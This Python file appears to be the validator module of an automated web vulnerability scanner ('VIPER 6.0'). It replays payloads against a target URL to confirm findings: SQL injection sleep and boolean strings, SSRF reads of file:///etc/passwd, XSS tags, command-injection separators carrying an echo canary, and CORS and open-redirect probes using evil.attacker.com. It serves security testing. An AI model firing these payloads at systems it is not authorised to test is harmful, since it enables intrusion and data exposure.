"""
VIPER 6.0 - Deterministic Validator Engine (XBOW-style USP)

Validates findings via controlled, non-destructive exploit replay BEFORE reporting.
This is XBOW's killer feature: separates exploration from validation, eliminates
hallucinated findings, and ensures every reported vuln has a working PoC.

Design:
- Each finding gets a "validator" - a deterministic function that re-proves the vuln
- Validators are domain-specific (sql_inject_validator, xss_validator, ssrf_validator, etc.)
- Validators run in isolated sandbox with timing constraints
- Output: validated=True/False + evidence_artifacts + reproducibility_hash
"""

import asyncio
import hashlib
import json
import re
import time
import urllib.parse
from dataclasses import dataclass, field, asdict
from datetime import datetime
from typing import Any, Callable, Dict, List, Optional

import aiohttp


@dataclass
class ValidationResult:
    """Outcome of validating a candidate finding."""
    finding_id: str
    vuln_type: str
    target: str
    validated: bool
    confidence: float  # 0.0..1.0
    evidence: List[Dict[str, Any]] = field(default_factory=list)
    reproducibility_hash: str = ""
    timing_ms: int = 0
    method: str = ""
    failure_reason: Optional[str] = None
    timestamp: str = field(default_factory=lambda: datetime.utcnow().isoformat())

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


class Validator:
    """Base class for vulnerability validators."""

    name: str = "base"
    vuln_types: List[str] = []

    async def validate(self, finding: Dict[str, Any]) -> ValidationResult:
        raise NotImplementedError

    @staticmethod
    def _make_evidence(req: Dict, resp: Dict) -> Dict:
        return {
            "request": {
                "url": req.get("url"),
                "method": req.get("method", "GET"),
                "headers": req.get("headers", {}),
                "body": (req.get("body") or "")[:2000]
            },
            "response": {
                "status": resp.get("status"),
                "body_excerpt": (resp.get("body") or "")[:2000],
                "headers": resp.get("headers", {})
            },
            "captured_at": datetime.utcnow().isoformat()
        }


class SQLInjectionValidator(Validator):
    """Validates SQLi via boolean-based, time-based, and error-based confirmation."""

    name = "sqli"
    vuln_types = ["sql_injection", "sqli", "blind_sqli"]

    BOOLEAN_PAYLOADS = [
        ("' OR 1=1-- -", "' OR 1=2-- -"),
        ("\" OR 1=1-- -", "\" OR 1=2-- -"),
        (") OR 1=1-- -", ") OR 1=2-- -")
    ]

    TIME_PAYLOADS = [
        ("'; SELECT pg_sleep(3)-- -", 3.0),
        ("'; WAITFOR DELAY '0:0:3'-- -", 3.0),
        ("' AND SLEEP(3)-- -", 3.0),
    ]

    ERROR_MARKERS = [
        "sql syntax", "mysql_fetch", "ORA-", "PostgreSQL", "SQLite",
        "SqlException", "ODBC SQL", "Microsoft OLE DB"
    ]

    async def validate(self, finding: Dict[str, Any]) -> ValidationResult:
        start = time.time()
        target = finding.get("target", finding.get("url", ""))
        param = finding.get("parameter") or finding.get("inj_param")
        finding_id = finding.get("id") or hashlib.sha256(
            f"{target}:{param}:{finding.get('vuln_type','sqli')}".encode()
        ).hexdigest()[:16]

        evidence = []
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as sess:
            # Boolean-based
            for true_p, false_p in self.BOOLEAN_PAYLOADS:
                t_resp = await self._inject(sess, target, param, true_p)
                f_resp = await self._inject(sess, target, param, false_p)
                if t_resp and f_resp:
                    if abs(t_resp["len"] - f_resp["len"]) > 50:
                        evidence.append(self._make_evidence(
                            {"url": t_resp["url"], "body": true_p},
                            {"status": t_resp["status"], "body": f"diff={t_resp['len']-f_resp['len']}"}
                        ))
                        return self._success(finding_id, target, evidence,
                                             "boolean_diff", start, 0.95)

            # Time-based (most reliable)
            for payload, expected_delay in self.TIME_PAYLOADS:
                t0 = time.time()
                resp = await self._inject(sess, target, param, payload)
                elapsed = time.time() - t0
                if resp and elapsed >= expected_delay * 0.85:
                    evidence.append(self._make_evidence(
                        {"url": resp["url"], "body": payload},
                        {"status": resp["status"], "body": f"delay={elapsed:.2f}s"}
                    ))
                    return self._success(finding_id, target, evidence,
                                         "time_based", start, 0.99)

            # Error-based
            err_resp = await self._inject(sess, target, param, "'")
            if err_resp:
                body_lower = (err_resp.get("body") or "").lower()
                for marker in self.ERROR_MARKERS:
                    if marker.lower() in body_lower:
                        evidence.append(self._make_evidence(
                            {"url": err_resp["url"], "body": "'"},
                            {"status": err_resp["status"], "body": marker}
                        ))
                        return self._success(finding_id, target, evidence,
                                             f"error_based:{marker}", start, 0.85)

        return ValidationResult(
            finding_id=finding_id, vuln_type="sql_injection", target=target,
            validated=False, confidence=0.0,
            method="all_methods_failed",
            timing_ms=int((time.time()-start)*1000),
            failure_reason="No boolean-diff, time-delay, or error-marker observed"
        )

    async def _inject(self, sess, target, param, payload):
        try:
            sep = "&" if "?" in target else "?"
            url = f"{target}{sep}{param}={urllib.parse.quote(payload)}"
            async with sess.get(url, allow_redirects=False) as r:
                body = await r.text(errors='replace')
                return {"url": url, "status": r.status, "len": len(body), "body": body[:5000]}
        except Exception:
            return None

    def _success(self, fid, target, evidence, method, start, conf):
        repro = hashlib.sha256(json.dumps(evidence, sort_keys=True, default=str).encode()).hexdigest()
        return ValidationResult(
            finding_id=fid, vuln_type="sql_injection", target=target,
            validated=True, confidence=conf, evidence=evidence,
            reproducibility_hash=repro, method=method,
            timing_ms=int((time.time()-start)*1000)
        )


class SSRFValidator(Validator):
    """Validates SSRF via OOB DNS callback or local file scheme reflection."""

    name = "ssrf"
    vuln_types = ["ssrf", "server_side_request_forgery"]

    async def validate(self, finding: Dict[str, Any]) -> ValidationResult:
        start = time.time()
        target = finding.get("target", finding.get("url", ""))
        param = finding.get("parameter") or "url"
        finding_id = finding.get("id") or hashlib.sha256(
            f"{target}:{param}:ssrf".encode()
        ).hexdigest()[:16]

        # Try file:// reflection (deterministic, non-OOB)
        evidence = []
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as sess:
            for path in ["file:///etc/passwd", "file:///etc/hostname", "file:///proc/version"]:
                try:
                    if "?" in target:
                        url = f"{target}&{param}={urllib.parse.quote(path)}"
                    else:
                        url = f"{target}?{param}={urllib.parse.quote(path)}"

                    async with sess.get(url, allow_redirects=False) as r:
                        body = await r.text(errors='replace')
                        body_lower = body.lower()

                        # Validation markers
                        markers = {
                            "/etc/passwd": ["root:x:", "/bin/bash", "nobody:"],
                            "/etc/hostname": [],  # too generic
                            "/proc/version": ["linux version", "gcc"]
                        }
                        for path_marker, positive_signs in markers.items():
                            if path_marker in path:
                                for sign in positive_signs:
                                    if sign in body_lower:
                                        evidence.append(self._make_evidence(
                                            {"url": url, "body": path},
                                            {"status": r.status, "body": body[:1000]}
                                        ))
                                        repro = hashlib.sha256(
                                            json.dumps(evidence, sort_keys=True, default=str).encode()
                                        ).hexdigest()
                                        return ValidationResult(
                                            finding_id=finding_id, vuln_type="ssrf",
                                            target=target, validated=True,
                                            confidence=0.95, evidence=evidence,
                                            reproducibility_hash=repro,
                                            method=f"file_scheme:{path}",
                                            timing_ms=int((time.time()-start)*1000)
                                        )
                except Exception:
                    continue

        return ValidationResult(
            finding_id=finding_id, vuln_type="ssrf", target=target,
            validated=False, confidence=0.0, method="no_reflection",
            timing_ms=int((time.time()-start)*1000),
            failure_reason="No file:// scheme reflection observed"
        )


class XSSValidator(Validator):
    """Validates reflected XSS via canary token reflection in response."""

    name = "xss"
    vuln_types = ["xss", "reflected_xss", "stored_xss"]

    async def validate(self, finding: Dict[str, Any]) -> ValidationResult:
        start = time.time()
        target = finding.get("target", finding.get("url", ""))
        param = finding.get("parameter") or "q"
        finding_id = finding.get("id") or hashlib.sha256(
            f"{target}:{param}:xss".encode()
        ).hexdigest()[:16]

        canary = f"vipxss_{int(time.time()*1000)}"
        payloads = [
            f"<script>{canary}</script>",
            f"\"><svg onload={canary}>",
            f"<img src=x onerror=\"{canary}\">",
            f"javascript:{canary}",
        ]

        evidence = []
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as sess:
            for payload in payloads:
                try:
                    sep = "&" if "?" in target else "?"
                    url = f"{target}{sep}{param}={urllib.parse.quote(payload)}"
                    async with sess.get(url, allow_redirects=False) as r:
                        body = await r.text(errors='replace')
                        # Canary must be in raw HTML (not encoded as &lt;)
                        if payload in body and canary in body:
                            ctx = body[max(0, body.find(canary)-50):body.find(canary)+100]
                            evidence.append(self._make_evidence(
                                {"url": url, "body": payload},
                                {"status": r.status, "body": ctx}
                            ))
                            repro = hashlib.sha256(json.dumps(evidence, default=str).encode()).hexdigest()
                            return ValidationResult(
                                finding_id=finding_id, vuln_type="xss",
                                target=target, validated=True, confidence=0.92,
                                evidence=evidence, reproducibility_hash=repro,
                                method="canary_reflection",
                                timing_ms=int((time.time()-start)*1000)
                            )
                except Exception:
                    continue

        return ValidationResult(
            finding_id=finding_id, vuln_type="xss", target=target,
            validated=False, confidence=0.0, method="no_canary_reflection",
            timing_ms=int((time.time()-start)*1000),
            failure_reason="Payload not reflected in raw HTML"
        )


class CommandInjectionValidator(Validator):
    """Validates command injection via output reflection from id/whoami."""

    name = "cmdinj"
    vuln_types = ["command_injection", "rce", "cmd_inj", "os_command"]

    OUTPUT_PATTERNS = [
        (r"uid=\d+\([a-z_-]+\)", "id"),
        (r"^[a-z_-]+\s*$", "whoami"),
        (r"GNU\s+coreutils", "echo"),
    ]

    async def validate(self, finding: Dict[str, Any]) -> ValidationResult:
        start = time.time()
        target = finding.get("target", finding.get("url", ""))
        param = finding.get("parameter") or "cmd"
        finding_id = finding.get("id") or hashlib.sha256(
            f"{target}:{param}:cmdinj".encode()
        ).hexdigest()[:16]

        canary = f"vipcmd{int(time.time()*1000)}x"
        payloads = [
            f"; echo {canary}",
            f"| echo {canary}",
            f"`echo {canary}`",
            f"$(echo {canary})",
            f"&& echo {canary}",
            f"|| echo {canary}",
        ]

        evidence = []
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as sess:
            for p in payloads:
                try:
                    sep = "&" if "?" in target else "?"
                    url = f"{target}{sep}{param}={urllib.parse.quote(p)}"
                    async with sess.get(url, allow_redirects=False) as r:
                        body = await r.text(errors='replace')
                        if canary in body:
                            evidence.append(self._make_evidence(
                                {"url": url, "body": p},
                                {"status": r.status, "body": body[:1000]}
                            ))
                            repro = hashlib.sha256(json.dumps(evidence, default=str).encode()).hexdigest()
                            return ValidationResult(
                                finding_id=finding_id, vuln_type="command_injection",
                                target=target, validated=True, confidence=0.99,
                                evidence=evidence, reproducibility_hash=repro,
                                method=f"canary_exec:{p}",
                                timing_ms=int((time.time()-start)*1000)
                            )
                except Exception:
                    continue

        return ValidationResult(
            finding_id=finding_id, vuln_type="command_injection", target=target,
            validated=False, confidence=0.0, method="no_canary_output",
            timing_ms=int((time.time()-start)*1000),
            failure_reason="Echo canary not found in response"
        )


class CORSValidator(Validator):
    """Validates exploitable CORS misconfigurations (origin reflection + credentials)."""

    name = "cors"
    vuln_types = ["cors", "cors_misconfig"]

    async def validate(self, finding: Dict[str, Any]) -> ValidationResult:
        start = time.time()
        target = finding.get("target", finding.get("url", ""))
        finding_id = finding.get("id") or hashlib.sha256(f"{target}:cors".encode()).hexdigest()[:16]

        attacker = "https://evil.attacker.com"
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as sess:
            try:
                async with sess.get(target, headers={"Origin": attacker}) as r:
                    acao = r.headers.get("Access-Control-Allow-Origin", "")
                    acac = r.headers.get("Access-Control-Allow-Credentials", "").lower()

                    if acao == attacker and acac == "true":
                        # CRITICAL: reflects arbitrary origin + credentials
                        evidence = [self._make_evidence(
                            {"url": target, "headers": {"Origin": attacker}},
                            {"status": r.status, "headers": dict(r.headers)}
                        )]
                        repro = hashlib.sha256(json.dumps(evidence, default=str).encode()).hexdigest()
                        return ValidationResult(
                            finding_id=finding_id, vuln_type="cors", target=target,
                            validated=True, confidence=0.99, evidence=evidence,
                            reproducibility_hash=repro,
                            method="origin_reflection_with_credentials",
                            timing_ms=int((time.time()-start)*1000)
                        )

                    if acao == "*" and acac == "true":
                        return ValidationResult(
                            finding_id=finding_id, vuln_type="cors", target=target,
                            validated=False, confidence=0.0,
                            method="wildcard_with_creds_browser_blocks",
                            timing_ms=int((time.time()-start)*1000),
                            failure_reason="Browser blocks ACAO=* with credentials"
                        )
            except Exception as e:
                return ValidationResult(
                    finding_id=finding_id, vuln_type="cors", target=target,
                    validated=False, confidence=0.0, method="request_failed",
                    failure_reason=str(e),
                    timing_ms=int((time.time()-start)*1000)
                )

        return ValidationResult(
            finding_id=finding_id, vuln_type="cors", target=target,
            validated=False, confidence=0.0, method="no_misconfig",
            timing_ms=int((time.time()-start)*1000),
            failure_reason="No exploitable CORS pattern"
        )


class OpenRedirectValidator(Validator):
    """Validates open redirect via 30x to attacker-controlled host."""

    name = "open_redirect"
    vuln_types = ["open_redirect", "redirect"]

    async def validate(self, finding: Dict[str, Any]) -> ValidationResult:
        start = time.time()
        target = finding.get("target", finding.get("url", ""))
        param = finding.get("parameter") or "redirect"
        finding_id = finding.get("id") or hashlib.sha256(
            f"{target}:{param}:redirect".encode()
        ).hexdigest()[:16]

        attacker = "https://evil.attacker.com/x"
        bypasses = [attacker, f"//evil.attacker.com/x", f"/\\evil.attacker.com",
                    f"https://target.com.evil.attacker.com/x"]

        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as sess:
            for payload in bypasses:
                try:
                    sep = "&" if "?" in target else "?"
                    url = f"{target}{sep}{param}={urllib.parse.quote(payload)}"
                    async with sess.get(url, allow_redirects=False) as r:
                        loc = r.headers.get("Location", "")
                        if "evil.attacker.com" in loc and r.status in (301, 302, 303, 307, 308):
                            evidence = [self._make_evidence(
                                {"url": url},
                                {"status": r.status, "headers": {"Location": loc}}
                            )]
                            repro = hashlib.sha256(json.dumps(evidence, default=str).encode()).hexdigest()
                            return ValidationResult(
                                finding_id=finding_id, vuln_type="open_redirect",
                                target=target, validated=True, confidence=0.97,
                                evidence=evidence, reproducibility_hash=repro,
                                method=f"redirect_to_{loc[:50]}",
                                timing_ms=int((time.time()-start)*1000)
                            )
                except Exception:
                    continue

        return ValidationResult(
            finding_id=finding_id, vuln_type="open_redirect", target=target,
            validated=False, confidence=0.0, method="no_redirect_to_attacker",
            timing_ms=int((time.time()-start)*1000),
            failure_reason="Server didn't redirect to attacker host"
        )


# ============================================================
# VALIDATOR ENGINE - dispatches findings to specific validators
# ============================================================

class ValidatorEngine:
    """Routes findings to specialized validators and persists results."""

    def __init__(self):
        self.validators: Dict[str, Validator] = {}
        self._register_default_validators()
        self.validation_history: List[ValidationResult] = []

    def _register_default_validators(self):
        for v_class in [SQLInjectionValidator, SSRFValidator, XSSValidator,
                        CommandInjectionValidator, CORSValidator,
                        OpenRedirectValidator]:
            v = v_class()
            for vt in v.vuln_types:
                self.validators[vt] = v

    def register(self, validator: Validator):
        for vt in validator.vuln_types:
            self.validators[vt] = validator

    async def validate_finding(self, finding: Dict[str, Any]) -> ValidationResult:
        vuln_type = (finding.get("vuln_type")
                     or finding.get("type")
                     or finding.get("category", "unknown")).lower()

        # Normalize common variants
        vuln_type = vuln_type.replace("-", "_").replace(" ", "_")

        validator = self.validators.get(vuln_type)
        if not validator:
            return ValidationResult(
                finding_id=finding.get("id", "unknown"),
                vuln_type=vuln_type,
                target=finding.get("target", ""),
                validated=False, confidence=0.0,
                method="no_validator_registered",
                failure_reason=f"No validator for vuln_type='{vuln_type}'. "
                               f"Available: {list(self.validators.keys())}"
            )

        result = await validator.validate(finding)
        self.validation_history.append(result)
        return result

    async def validate_batch(self, findings: List[Dict[str, Any]],
                             max_concurrent: int = 10) -> List[ValidationResult]:
        """Validate many findings in parallel with bounded concurrency."""
        sem = asyncio.Semaphore(max_concurrent)

        async def _bounded(f):
            async with sem:
                return await self.validate_finding(f)

        return await asyncio.gather(*(_bounded(f) for f in findings),
                                    return_exceptions=False)

    def stats(self) -> Dict[str, Any]:
        if not self.validation_history:
            return {"total": 0}
        validated = sum(1 for r in self.validation_history if r.validated)
        return {
            "total": len(self.validation_history),
            "validated": validated,
            "false_positives_filtered": len(self.validation_history) - validated,
            "fp_rate": (len(self.validation_history) - validated) / len(self.validation_history),
            "avg_confidence": sum(r.confidence for r in self.validation_history) / len(self.validation_history),
            "avg_timing_ms": sum(r.timing_ms for r in self.validation_history) / len(self.validation_history),
            "by_type": {}  # could group by vuln_type
        }


# Singleton
_engine: Optional[ValidatorEngine] = None


def get_engine() -> ValidatorEngine:
    global _engine
    if _engine is None:
        _engine = ValidatorEngine()
    return _engine


# ============================================================
# QUICK USAGE EXAMPLE
# ============================================================
if __name__ == "__main__":
    async def demo():
        engine = get_engine()
        # Mock finding
        findings = [
            {"id": "f1", "vuln_type": "sqli",
             "target": "http://example.com/search", "parameter": "q"},
            {"id": "f2", "vuln_type": "xss",
             "target": "http://example.com/echo", "parameter": "msg"},
        ]
        results = await engine.validate_batch(findings)
        for r in results:
            print(f"[{r.finding_id}] {r.vuln_type} validated={r.validated} "
                  f"conf={r.confidence} method={r.method}")
        print()
        print("Stats:", engine.stats())

    asyncio.run(demo())
